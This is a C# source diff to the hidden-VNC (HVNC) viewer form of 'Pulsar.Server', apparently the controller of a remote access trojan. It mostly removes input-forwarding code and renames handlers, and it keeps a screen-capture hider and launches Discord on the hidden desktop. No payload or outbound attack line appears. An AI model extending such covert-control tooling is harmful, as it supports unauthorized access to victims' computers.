@@ -30,16 +30,6 @@ namespace Pulsar.Server.Forms
         private bool _enableKeyboardInput;
 
         /// <summary>
-        /// Holds the state of the local keyboard hooks.
-        /// </summary>
-        private IKeyboardMouseEvents _keyboardHook;
-
-        /// <summary>
-        /// Holds the state of the local mouse hooks.
-        /// </summary>
-        private IKeyboardMouseEvents _mouseHook;
-
-        /// <summary>
         /// A list of pressed keys for synchronization between key down & -up events.
         /// </summary>
         private readonly List<Keys> _keysPressed;
@@ -82,7 +72,7 @@ namespace Pulsar.Server.Forms
         }
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="FrmRemoteDesktop"/> class using the given client.
+        /// Initializes a new instance of the <see cref="FrmHVNC"/> class using the given client.
         /// </summary>
         /// <param name="client">The client used for the remote desktop form.</param>
         public FrmHVNC(Client client)
@@ -95,7 +85,7 @@ namespace Pulsar.Server.Forms
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         /// <summary>
@@ -130,12 +120,12 @@ namespace Pulsar.Server.Forms
             _hVNCHandler.ProgressChanged -= UpdateImage;
             _connectClient.ClientState -= ClientDisconnected;
         }
+
         /// <summary>
         /// Subscribes to local mouse and keyboard events for remote desktop input.
         /// </summary>
         private void SubscribeEvents()
         {
-
         }
 
         /// <summary>
@@ -143,7 +133,6 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void UnsubscribeEvents()
         {
-
         }
 
         /// <summary>
@@ -155,10 +144,6 @@ namespace Pulsar.Server.Forms
 
             picDesktop.addClient(_connectClient);
             picDesktop.Start();
-            
-            picDesktop.EnableMouseInput = false;
-            picDesktop.EnableKeyboardInput = false;
-            
             // Subscribe to the new frame counter.
             picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
 
@@ -175,27 +160,12 @@ namespace Pulsar.Server.Forms
             ToggleConfigurationControls(false);
 
             picDesktop.Stop();
-            
-            picDesktop.EnableMouseInput = false;
-            picDesktop.EnableKeyboardInput = false;
-            
             // Unsubscribe from the frame counter. It will be re-created when starting again.
             picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);
 
-            _enableMouseInput = false;
-            _enableKeyboardInput = false;
-            btnMouse.Image = Properties.Resources.mouse_delete;            btnKeyboard.Image = Properties.Resources.keyboard_delete;
-            toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
-            toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
-            
-            UpdateInputButtonsVisualState();
-            
             this.ActiveControl = picDesktop;
 
             _hVNCHandler.EndReceiveFrames();
-            
-            // Reset window title
-            this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);
         }
 
         /// <summary>
@@ -280,36 +250,25 @@ namespace Pulsar.Server.Forms
             picDesktop.UpdateImage(bmp, false);
         }
 
-        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
+        private void FrmHVNC_Load(object sender, EventArgs e)
         {
-            this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);
+            this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);
 
             OnResize(EventArgs.Empty); // trigger resize event to align controls 
 
             cbMonitors.SelectedIndex = 0;
-            
-            // Make sure input is disabled initially
-            _enableMouseInput = false;
-            _enableKeyboardInput = false;            btnMouse.Image = Properties.Resources.mouse_delete;
-            btnKeyboard.Image = Properties.Resources.keyboard_delete;
-            toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
-            toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
-            
-            // Update button visual state
-            UpdateInputButtonsVisualState();
-        }        /// <summary>
+        }
+
+        /// <summary>
         /// Updates the title with the current frames per second.
         /// </summary>
         /// <param name="e">The new frames per second.</param>
         private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
         {
-            string baseTitle = WindowHelper.GetWindowTitle("HVNC", _connectClient);
-            string fpsInfo = $"FPS: {e.CurrentFramesPerSecond.ToString("0.00")}";
-            
-            this.Text = $"{baseTitle} - {fpsInfo}";
+            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
         }
 
-        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
+        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
         {
             // all cleanup logic goes here
             UnsubscribeEvents();
@@ -319,7 +278,7 @@ namespace Pulsar.Server.Forms
             picDesktop.Image?.Dispose();
         }
 
-        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
+        private void FrmHVNC_Resize(object sender, EventArgs e)
         {
             if (WindowState == FormWindowState.Minimized)
                 return;
@@ -365,7 +324,9 @@ namespace Pulsar.Server.Forms
                 lblQualityShow.Text += " (mid)";
 
             this.ActiveControl = picDesktop;
-        }        private void btnMouse_Click(object sender, EventArgs e)
+        }
+
+        private void btnMouse_Click(object sender, EventArgs e)
         {
             if (_enableMouseInput)
             {
@@ -373,23 +334,15 @@ namespace Pulsar.Server.Forms
                 btnMouse.Image = Properties.Resources.mouse_delete;
                 toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                 _enableMouseInput = false;
-                picDesktop.EnableMouseInput = false;
             }
             else
             {
-                if (!_hVNCHandler.IsStarted)
-                {
-                    return;
-                }
-                
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnMouse.Image = Properties.Resources.mouse_add;
                 toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                 _enableMouseInput = true;
-                picDesktop.EnableMouseInput = true;
             }
 
-            UpdateInputButtonsVisualState();
             this.ActiveControl = picDesktop;
         }
 
@@ -401,27 +354,15 @@ namespace Pulsar.Server.Forms
                 btnKeyboard.Image = Properties.Resources.keyboard_delete;
                 toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
                 _enableKeyboardInput = false;
-                picDesktop.EnableKeyboardInput = false;
-                
-                picDesktop.ClearKeyboardState();
             }
             else
             {
-                if (!_hVNCHandler.IsStarted)
-                {
-                    return;
-                }
-                
                 this.picDesktop.Cursor = Cursors.Hand;
                 btnKeyboard.Image = Properties.Resources.keyboard_add;
                 toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
                 _enableKeyboardInput = true;
-                picDesktop.EnableKeyboardInput = true;
-                
-                picDesktop.Focus();
             }
 
-            UpdateInputButtonsVisualState();
             this.ActiveControl = picDesktop;
         }
 
@@ -524,99 +465,6 @@ namespace Pulsar.Server.Forms
             {
                 Application = "Discord"
             });
-        }
-
-        protected override bool ProcessDialogKey(Keys keyData)
-        {
-            if (_enableKeyboardInput && _hVNCHandler.IsStarted)
-            {
-                return base.ProcessDialogKey(keyData);
-            }
-            
-            if ((keyData & Keys.KeyCode) == Keys.Tab || 
-                (keyData & Keys.KeyCode) == Keys.Left || 
-                (keyData & Keys.KeyCode) == Keys.Right || 
-                (keyData & Keys.KeyCode) == Keys.Up || 
-                (keyData & Keys.KeyCode) == Keys.Down ||
-                (keyData & Keys.KeyCode) == Keys.Escape ||
-                (keyData & Keys.KeyCode) == Keys.Enter)
-            {
-                return base.ProcessDialogKey(keyData);
-            }
-            
-            return true;
-        }        protected override void OnKeyDown(KeyEventArgs e)
-        {
-            if (_enableKeyboardInput && _hVNCHandler.IsStarted)
-            {
-                base.OnKeyDown(e);
-                
-                if (!picDesktop.Focused)
-                {
-                    picDesktop.Focus();
-                }
-            }
-            else
-            {
-                if (e.KeyCode == Keys.Tab || 
-                    e.KeyCode == Keys.Left || 
-                    e.KeyCode == Keys.Right || 
-                    e.KeyCode == Keys.Up || 
-                    e.KeyCode == Keys.Down ||
-                    e.KeyCode == Keys.Escape ||
-                    e.KeyCode == Keys.Enter)
-                {
-                    base.OnKeyDown(e);
-                }
-                else
-                {
-                    e.Handled = true;
-                    e.SuppressKeyPress = true;
-                }
-            }
-        }
-
-        protected override void OnActivated(EventArgs e)
-        {
-            base.OnActivated(e);
-            
-            if (_enableKeyboardInput && _hVNCHandler.IsStarted)
-            {
-                picDesktop.Focus();
-            }
-        }        private void UpdateTitleWithInputStatus()
-        {
-            string baseTitle = WindowHelper.GetWindowTitle("HVNC", _connectClient);
-            
-            this.Text = baseTitle;
-        }
-
-        /// <summary>
-        /// Updates the visual state of the input buttons based on current input settings
-        /// </summary>
-        private void UpdateInputButtonsVisualState()
-        {
-            if (_enableMouseInput)
-            {
-                btnMouse.BackColor = System.Drawing.Color.FromArgb(0, 120, 0); // Dark green
-                btnMouse.FlatAppearance.BorderColor = System.Drawing.Color.LimeGreen;
-            }
-            else
-            {
-                btnMouse.BackColor = System.Drawing.Color.FromArgb(40, 40, 40); // Default dark
-                btnMouse.FlatAppearance.BorderColor = System.Drawing.Color.Gray;
-            }
-
-            if (_enableKeyboardInput)
-            {
-                btnKeyboard.BackColor = System.Drawing.Color.FromArgb(0, 120, 0); // Dark green
-                btnKeyboard.FlatAppearance.BorderColor = System.Drawing.Color.LimeGreen;
-            }
-            else
-            {
-                btnKeyboard.BackColor = System.Drawing.Color.FromArgb(40, 40, 40); // Default dark
-                btnKeyboard.FlatAppearance.BorderColor = System.Drawing.Color.Gray;
-            }
         }
     }
 }
